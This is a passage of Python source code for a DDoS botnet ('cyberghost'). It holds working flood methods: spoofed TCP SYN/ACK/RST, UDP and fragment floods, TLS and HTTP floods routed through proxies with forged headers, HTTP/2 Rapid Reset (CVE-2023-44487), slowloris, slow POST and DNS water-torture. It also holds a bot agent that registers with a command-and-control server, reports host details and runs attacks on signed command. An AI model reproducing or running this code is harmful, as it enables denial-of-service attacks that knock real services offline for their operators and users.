    if sock is None: return await udp_flood(ctx)
    sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                src = rnd_ip(); payload = os.urandom(1200)
                udp_hdr = struct.pack("!HHHH", random.randint(1024,65535), ctx["port"] or 53, 8+len(payload), 0)
                full = udp_hdr + payload
                for i in range(0, len(full), 680):
                    chunk = full[i:i+680]; off = i // 8
                    pkt = build_ip_frag(src, ip, socket.IPPROTO_UDP, chunk, off, mf=(i+680 < len(full)))
                    await loop.sock_sendto(sock, pkt, (ip,0))
                    stats["r"] += 1; stats["b"] += len(pkt)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],128))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def tcp_syn(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 80
    loop = asyncio.get_running_loop(); deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = raw_socket_tcp()
    if sock is None: return await tcp_connect(ctx)
    sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                pkt = build_ip_tcp(rnd_ip(), ip, random.randint(1024,65535), port, 0x02, random.randint(0, 2**32-1))
                await loop.sock_sendto(sock, pkt, (ip, port))
                stats["r"] += 1; stats["b"] += len(pkt)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],512))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def tcp_ack(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 80
    loop = asyncio.get_running_loop(); deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = raw_socket_tcp()
    if sock is None: return await tcp_connect(ctx)
    sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                pkt = build_ip_tcp(rnd_ip(), ip, random.randint(1024,65535), port, 0x10,
                                   random.randint(0, 2**32-1), random.randint(0, 2**32-1))
                await loop.sock_sendto(sock, pkt, (ip, port))
                stats["r"] += 1; stats["b"] += len(pkt)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],512))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def tcp_rst(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 80
    loop = asyncio.get_running_loop(); deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = raw_socket_tcp()
    if sock is None: return await tcp_connect(ctx)
    sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                pkt = build_ip_tcp(rnd_ip(), ip, random.randint(1024,65535), port, 0x04, random.randint(0, 2**32-1))
                await loop.sock_sendto(sock, pkt, (ip, port))
                stats["r"] += 1; stats["b"] += len(pkt)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],512))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def tcp_connect(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 80
    max_conn = min(ctx["threads"], 2048)
    deadline = time.time()+ctx["duration"]; stats = {"r":0}
    async def one():
        while time.time() < deadline:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
                w.close(); stats["r"] += 1
            except Exception: await asyncio.sleep(0.01)
    tasks = [asyncio.create_task(one()) for _ in range(max_conn)]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],0); stats["r"]=0
    for t in tasks: t.cancel()

async def udp_flood(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 53
    loop = asyncio.get_running_loop(); deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                p = os.urandom(random.randint(512,1400))
                await loop.sock_sendto(sock, p, (ip, port))
                stats["r"] += 1; stats["b"] += len(p)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],256))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def tls_handshake(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 443
    deadline = time.time()+ctx["duration"]; stats = {"r":0}
    async def one():
        while time.time() < deadline:
            try:
                c = ssl.create_default_context(); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, port, ssl=c, server_hostname=host), timeout=10)
                w.close(); stats["r"] += 1
            except Exception: await asyncio.sleep(0.005)
    tasks = [asyncio.create_task(one()) for _ in range(ctx["threads"])]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],0); stats["r"]=0
    for t in tasks: t.cancel()

async def tls_reneg(ctx):
    # TLS 1.3 removed renegotiation — fresh-handshake flood with no ticket
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 443
    deadline = time.time()+ctx["duration"]; stats = {"r":0}
    async def one():
        while time.time() < deadline:
            try:
                c = ssl.create_default_context(); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
                c.options |= ssl.OP_NO_TICKET
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, port, ssl=c, server_hostname=host), timeout=10)
                w.close(); stats["r"] += 1
            except Exception: await asyncio.sleep(0.005)
    tasks = [asyncio.create_task(one()) for _ in range(ctx["threads"])]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],0); stats["r"]=0
    for t in tasks: t.cancel()

async def tls_record(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 443
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    async def one():
        while time.time() < deadline:
            try:
                c = ssl.create_default_context(); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, port, ssl=c, server_hostname=host), timeout=10)
                for _ in range(16):
                    rec = struct.pack("!BHH", 0x17, 0x0303, random.randint(1,200)) + os.urandom(random.randint(1,200))
                    w.write(rec); stats["b"] += len(rec); stats["r"] += 1
                await w.drain(); w.close()
            except Exception: await asyncio.sleep(0.005)
    tasks = [asyncio.create_task(one()) for _ in range(ctx["threads"])]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel()

_session_pool = None
_curl_pool = None
_agent_proxy_pool = None

def _get_session_pool():
    global _session_pool
    if _session_pool is None: _session_pool = SessionPool()
    return _session_pool

def _get_curl_pool():
    global _curl_pool
    if _curl_pool is None: _curl_pool = CurlSessionPool()
    return _curl_pool

async def _get_agent_proxy_pool():
    global _agent_proxy_pool
    if _agent_proxy_pool is None:
        _agent_proxy_pool = ProxyPool()
        await _agent_proxy_pool.load_and_start(PROXIES_FILE, require=False)
    return _agent_proxy_pool

async def _http_attack(ctx, mode):
    t = ctx["target"]
    if not t.startswith(("http://","https://")): t = "http://" + t
    u = urlparse(t); host = u.hostname; scheme = u.scheme
    port = u.port or (443 if scheme == "https" else 80)
    path = u.path or "/"
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}

    if AIOHTTP_SOCKS_OK:
        pool = await _get_agent_proxy_pool(); sess_pool = _get_session_pool()
        async def one():
            while time.time() < deadline:
                proxy = await pool.pick()
                if proxy is None and REQUIRE_PROXY:
                    await asyncio.sleep(0.5); continue
                try:
                    sess = await sess_pool.get(proxy)
                    if sess is None: await asyncio.sleep(0.05); continue
                    cb = rnd(12); ua = random.choice(UA_POOL); lang = random.choice(LANG_POOL)
                    headers = {"User-Agent": ua,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": lang,
                        "X-Forwarded-For": rnd_xff(), "X-Real-IP": rnd_xff(),
                        "CF-Connecting-IP": rnd_xff(),
                        "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document"}
                    url = scheme + "://" + host + path + "?cb=" + cb
                    try:
                        if mode == "post":
                            data = {"d": cb, "x": rnd(16)}
                            async with sess.post(url, data=data, headers=headers, ssl=False) as r:
                                await r.read(); stats["r"] += 1
                        elif mode == "rand":
                            m = random.choice(["GET","HEAD","OPTIONS"])
                            async with sess.request(m, url, headers=headers, ssl=False) as r:
                                await r.read(); stats["r"] += 1
                        else:
                            async with sess.get(url, headers=headers, ssl=False) as r:
                                await r.read(); stats["r"] += 1
                    except Exception: pass
                except Exception: pass
        tasks = [asyncio.create_task(one()) for _ in range(ctx["threads"])]
        while time.time() < deadline:
            await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
        for t in tasks: t.cancel()
        return

    if CURL_CFFI_OK:
        pool = await _get_agent_proxy_pool(); curl_pool = _get_curl_pool()
        async def one():
            while time.time() < deadline:
                proxy = await pool.pick()
                if proxy is None and REQUIRE_PROXY:
                    await asyncio.sleep(0.5); continue
                try:
                    sess = await curl_pool.get(proxy)
                    if sess is None: await asyncio.sleep(0.05); continue
                    imp = random.choice(IMPERSONATE_TARGETS) if IMPERSONATE_TARGETS else "chrome124"
                    url = scheme + "://" + host + path + "?cb=" + rnd(12)
                    try:
                        if mode == "post":
                            r = await sess.post(url, data={"d": rnd(8)}, impersonate=imp)
                        else:
                            r = await sess.get(url, impersonate=imp)
                        stats["r"] += 1; stats["b"] += len(r.content)
                    except Exception: pass
                except Exception: pass
        tasks = [asyncio.create_task(one()) for _ in range(ctx["threads"])]
        while time.time() < deadline:
            await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
        for t in tasks: t.cancel()
        return

    log.warning("_http_attack: no proxy lib — raw socket fallback (IP leak)")
    ip = socket.gethostbyname(host)
    ssl_ctx = None
    if scheme == "https":
        ssl_ctx = ssl.create_default_context(); ssl_ctx.check_hostname=False; ssl_ctx.verify_mode=ssl.CERT_NONE
    async def one_direct():
        while time.time() < deadline:
            try:
                r, w = await asyncio.open_connection(ip, port, ssl=ssl_ctx, server_hostname=host if scheme=="https" else None)
                m = "POST" if mode == "post" else random.choice(["GET","HEAD"]) if mode == "rand" else "GET"
                cb = rnd(12); ua = random.choice(UA_POOL); lang = random.choice(LANG_POOL)
                req = (m + " " + path + "?cb=" + cb + " HTTP/1.1\r\nHost: " + host + "\r\n"
                       "User-Agent: " + ua + "\r\nAccept-Language: " + lang + "\r\n"
                       "X-Forwarded-For: " + rnd_xff() + "\r\nX-Real-IP: " + rnd_xff() + "\r\n"
                       "CF-Connecting-IP: " + rnd_xff() + "\r\nConnection: keep-alive\r\n\r\n")
                w.write(req.encode()); await w.drain(); stats["r"] += 1; stats["b"] += len(req); w.close()
            except Exception: await asyncio.sleep(0.005)
    tasks = [asyncio.create_task(one_direct()) for _ in range(ctx["threads"])]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel()

async def http_get(c): await _http_attack(c, "get")
async def http_post(c): await _http_attack(c, "post")
async def http_rand(c): await _http_attack(c, "rand")

async def http2_rapid(ctx):
    # CVE-2023-44487 patched in nginx 1.25.3+, Cloudflare, Google, Akamai, AWS
    if not H2_OK: return await http_get(ctx)
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 443
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    async def one():
        while time.time() < deadline:
            try:
                c = ssl.create_default_context(); c.set_alpn_protocols(["h2"]); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, port, ssl=c, server_hostname=host), timeout=10)
                cfg = h2.connection.H2Configuration(client_side=True, header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection(); w.write(conn.data_to_send()); await w.drain()
                for _batch in range(10):
                    for _ in range(50):
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(":method","GET"),(":path","/?"+rnd(8)),(":authority",host),(":scheme","https")], end_stream=False)
                        conn.reset_stream(sid); stats["r"] += 1
                    w.write(conn.data_to_send()); await w.drain()
                    if time.time() >= deadline: break
                w.close()
            except Exception: await asyncio.sleep(0.005)
    tasks = [asyncio.create_task(one()) for _ in range(ctx["threads"])]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel()

async def slowloris(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 80
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    async def hold(w, interval):
        while time.time() < deadline:
            try:
                w.write(b"X-a: " + rnd(8).encode() + b"\r\n"); await w.drain(); stats["b"] += 12
            except Exception: return
            await asyncio.sleep(interval)
    tasks = []
    for _ in range(min(ctx["threads"], 8192)):
        try:
            r, w = await asyncio.open_connection(ip, port)
            req = ("GET /?" + rnd(20) + " HTTP/1.1\r\nHost: " + host + "\r\n"
                   "User-Agent: " + random.choice(UA_POOL) + "\r\nX-Forwarded-For: " + rnd_xff() + "\r\n")
            w.write(req.encode()); await w.drain(); stats["b"] += len(req); stats["r"] += 1
            tasks.append(asyncio.create_task(hold(w, random.uniform(3.0, 12.0))))
        except Exception: pass
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"], stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel()

async def slow_post(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 80
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    async def hold(w, interval):
        while time.time() < deadline:
            try: w.write(b"a"); await w.drain(); stats["b"] += 1
            except Exception: return
            await asyncio.sleep(interval)
    tasks = []
    for _ in range(min(ctx["threads"], 4096)):
        try:
            r, w = await asyncio.open_connection(ip, port)
            req = ("POST /?" + rnd(20) + " HTTP/1.1\r\nHost: " + host + "\r\n"
                   "User-Agent: " + random.choice(UA_POOL) + "\r\nContent-Length: 1000000\r\n"
                   "X-Forwarded-For: " + rnd_xff() + "\r\n\r\n")
            w.write(req.encode()); await w.drain(); stats["b"] += len(req); stats["r"] += 1
            tasks.append(asyncio.create_task(hold(w, random.uniform(3.0, 12.0))))
        except Exception: pass
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"], stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel()

async def dns_water(ctx):
    ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 53
    loop = asyncio.get_running_loop(); deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.setblocking(False)
    def build(name):
        tid = random.randint(0,65535)
        hdr = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0); q = b""
        for lbl in name.split("."):
            if not lbl: continue
            if len(lbl) > 63: lbl = lbl[:63]
            q += bytes([len(lbl)]) + lbl.encode()
        q += b"\x00" + struct.pack("!HH", 1, 1); return hdr + q
    while time.time() < deadline:
        try:
            labels = [rnd(random.randint(20,60)) for _ in range(random.randint(2,5))]
            name = ".".join(labels) + "." + host
            q = build(name); await loop.sock_sendto(sock, q, (ip, port))
            stats["r"] += 1; stats["b"] += len(q)
        except Exception: pass
        if stats["r"] % 256 == 0:
            await ctx["on_stats"](256, stats["b"]); stats["r"] -= 256; stats["b"]=0
    await ctx["on_stats"](stats["r"], stats["b"]); sock.close()

async def dns_nxdomain(c): await dns_water(c)

METHODS = {
    "icmp_flood": icmp_flood, "ip_fragment": ip_fragment, "udp_fragment": udp_fragment,
    "tcp_syn": tcp_syn, "tcp_ack": tcp_ack, "tcp_rst": tcp_rst, "tcp_connect": tcp_connect,
    "udp_flood": udp_flood,
    "tls_handshake": tls_handshake, "tls_reneg": tls_reneg, "tls_record": tls_record,
    "http_get": http_get, "http_post": http_post, "http_rand": http_rand,
    "http2_rapid": http2_rapid,
    "slowloris": slowloris, "slow_post": slow_post,
    "dns_water": dns_water, "dns_nxdomain": dns_nxdomain,
}

AGENT_STATE_DIR = os.path.expanduser("~/.cyberghost")
AGENT_STATE_FILE = os.path.join(AGENT_STATE_DIR, "attacks.json")

def _capabilities():
    caps = []
    if hasattr(os, "geteuid") and os.geteuid() == 0: caps.append("root")
    if raw_socket_tcp() is not None: caps.append("raw")
    if AIOHTTP_SOCKS_OK: caps.append("proxy")
    if CURL_CFFI_OK: caps.append("curl_cffi")
    if H2_OK: caps.append("h2")
    return ",".join(caps) or "user"

def _save_agent_state(state):
    with contextlib.suppress(Exception):
        os.makedirs(AGENT_STATE_DIR, exist_ok=True)
        with open(AGENT_STATE_FILE, "w") as f: json.dump(state, f)

def _load_agent_state():
    with contextlib.suppress(Exception):
        with open(AGENT_STATE_FILE, "r") as f: return json.load(f)
    return {}

class Agent:
    def __init__(self, c2, token):
        self.c2 = c2.rstrip("/"); self.token = token
        self.bot_id = hashlib.sha256((platform.node() + platform.machine()).encode()).hexdigest()[:16]
        self.tasks = {}; self.senders = {}; self.killed = False

    async def connect_loop(self):
        if not WS_AVAILABLE:
            log.error("websockets not installed"); return
        if self.c2.startswith("ws://") and not ALLOW_PLAINTEXT_AGENT:
            log.error("plaintext ws:// rejected"); return
        backoff = 3
        ws_url = self.c2.replace("https://","wss://").replace("http://","ws://") + "/ws/bot/" + self.bot_id
        headers = {"x-agent-token": self.token}
        while not self.killed:
            try:
                async with _ws_lib.connect(ws_url, extra_headers=headers, ping_interval=20, ping_timeout=20) as ws:
                    backoff = 3
                    log.info("agent connected as %s", self.bot_id)
                    await self.send_hello(ws)
                    hb = asyncio.create_task(self.heartbeat(ws))
                    try:
                        async for raw in ws: await self.handle(ws, raw)
                    finally:
                        hb.cancel()
                        with contextlib.suppress(BaseException): await hb
            except Exception as e:
                log.warning("agent disconnected: %s", e)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 60)

    async def _signed(self, msg):
        sig = sign_command(msg)
        return json.dumps({**msg, "_sig": sig})

    async def send_hello(self, ws):
        info = {"type":"hello","hostname":platform.node(),"os":platform.system(),
                "arch":platform.machine(),"cpu_cores":os.cpu_count() or 1,"ram_mb":0,
                "version":VERSION,"capabilities":_capabilities()}
        with contextlib.suppress(Exception):
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"): info["ram_mb"] = int(line.split()[1])//1024; break
        await ws.send(await self._signed(info))

    async def heartbeat(self, ws):
        while True:
            await asyncio.sleep(15 * random.uniform(0.6, 1.4))
            with contextlib.suppress(Exception):
                msg = {"type":"heartbeat","hostname":platform.node(),
                       "os":platform.system(),"arch":platform.machine(),
                       "cpu_cores":os.cpu_count() or 1,"ram_mb":0,"version":VERSION,"ts":time.time()}
                await ws.send(await self._signed(msg))

    async def handle(self, ws, raw):
        try: m = json.loads(raw)
        except Exception: return
        t = m.get("type")
        if t in ("attack","stop","kill"):
            sig = m.get("_sig","")
            base = {k:v for k,v in m.items() if k != "_sig"}
            if not verify_command_sig(base, sig):
                log.warning("bad sig type=%s", t); return
        if t == "kill":
            self.killed = True
            for task in list(self.tasks.values()): task.cancel()
            return
        if t == "stop":
            aid = m.get("attack_id"); task = self.tasks.pop(aid, None)
            if task: task.cancel()
            sender = self.senders.pop(aid, None)
            if sender: sender.stop()
            st = _load_agent_state(); st.pop(str(aid), None); _save_agent_state(st)
            return
        if t != "attack": return
        target_ip = m.get("target_ip","")
        if target_ip and not validate_target_agent(target_ip):
            log.warning("blocked target %s", target_ip); return
        aid = m["attack_id"]
        if aid in self.tasks: return
        sender = StatsSender(ws, aid); self.senders[aid] = sender
        target = m["target"]
        if target_ip and "://" in target:
            with contextlib.suppress(Exception):
                u = urlparse(target)
                target = u.scheme + "://" + target_ip + (":" + str(u.port) if u.port else "")
        elif target_ip and "://" not in target: target = target_ip
        ctx = {"target": target, "port": m.get("port",0), "duration": m["duration"],
               "threads": m["threads"], "attack_id": aid, "on_stats": sender.send}
        fn = METHODS.get(m["method"])
        if not fn: sender.stop(); self.senders.pop(aid, None); return
        st = _load_agent_state()
        st[str(aid)] = {"target": m["target"], "target_ip": target_ip, "method": m["method"],
                         "port": m.get("port",0), "duration": m["duration"],
                         "threads": m["threads"], "started_at": m.get("started_at", time.time())}
        _save_agent_state(st)
        async def runner():
            try: await fn(ctx)
            except asyncio.CancelledError: pass
            except Exception as e: log.warning("attack %d err: %s", aid, e)
            finally:
                s = self.senders.pop(aid, None)
                if s: s.stop()
                st2 = _load_agent_state(); st2.pop(str(aid), None); _save_agent_state(st2)
        task = asyncio.create_task(runner())
        self.tasks[aid] = task
        task.add_done_callback(lambda _t, _aid=aid: self.tasks.pop(_aid, None))

def _agent_worker_entry(c2, token):
    with contextlib.suppress(KeyboardInterrupt):
        asyncio.run(Agent(c2, token).connect_loop())

def run_agent(c2, token, workers=1):
    if workers <= 1:
        _agent_worker_entry(c2, token); return
    import multiprocessing as mp
    ctx = mp.get_context("spawn")
    procs = [ctx.Process(target=_agent_worker_entry, args=(c2, token)) for _ in range(workers)]
    for p in procs: p.start()
    try:
        for p in procs: p.join()
    except KeyboardInterrupt:
        for p in procs: p.terminate()

def do_check():
    ok = True
    if JWT_SECRET.startswith("change-me"): print("[!] JWT_SECRET default"); ok = False
    if not ADMIN_HASH and not ADMIN_PASS: print("[!] ADMIN creds empty"); ok = False
    if AGENT_SECRET.startswith("change-me"): print("[!] AGENT_SECRET default"); ok = False
    if REQUIRE_TLS and not (C2_TLS_CERT and C2_TLS_KEY): print("[!] TLS required"); ok = False
    if not WS_AVAILABLE: print("[!] websockets missing"); ok = False
    if not AIOHTTP_SOCKS_OK and not CURL_CFFI_OK: print("[!] no proxy lib"); ok = False
    try: import fastapi, uvicorn, aiosqlite, jose, passlib
    except ImportError as e: print("[!] missing: %s" % e); ok = False
    print("[+] check %s" % ("OK" if ok else "FAILED"))
    return ok

def gen_token(bot_id):
    if not BOT_ID_RE.match(bot_id):
        print("error: bot_id invalid", file=sys.stderr); sys.exit(1)
    print(make_bot_token(bot_id))

def hash_pass():
    print(pwd_ctx.hash(input("password: ")))

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--agent", action="store_true")
    ap.add_argument("--c2", default="https://127.0.0.1:8000")
    ap.add_argument("--token", default="")
    ap.add_argument("--workers", type=int, default=1)
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--gen-token", metavar="BOT_ID")
    ap.add_argument("--hash-pass", action="store_true")
    args = ap.parse_args()
    if args.gen_token: gen_token(args.gen_token); sys.exit(0)
    if args.hash_pass: hash_pass(); sys.exit(0)
    if args.check: sys.exit(0 if do_check() else 1)
    if args.agent:
        if not args.token:
            print("error: --token required", file=sys.stderr); sys.exit(1)
        run_agent(args.c2, args.token, args.workers)
    else:
        import uvicorn
        ssl_kwargs = {}
        if C2_TLS_CERT and C2_TLS_KEY:
            ssl_kwargs = {"ssl_certfile": C2_TLS_CERT, "ssl_keyfile": C2_TLS_KEY}
        uvicorn.run(app, host=C2_HOST, port=C2_PORT, workers=args.workers, **ssl_kwargs)
